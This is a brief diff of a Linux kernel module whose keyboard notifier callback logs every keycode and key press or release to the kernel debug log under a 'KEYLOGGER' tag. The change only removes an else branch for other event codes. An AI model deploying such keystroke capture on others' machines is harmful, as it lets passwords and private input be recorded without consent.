@@ -18,10 +18,6 @@ int hello_notify(struct notifier_block *nb, unsigned long code, void *_param) {
   
   if (code == KBD_KEYCODE) {
     printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
-  }  
-  else{
-    printk(KERN_DEBUG "Key has code : %lu", code);
-    return -1;
   }
   return 0;
 }
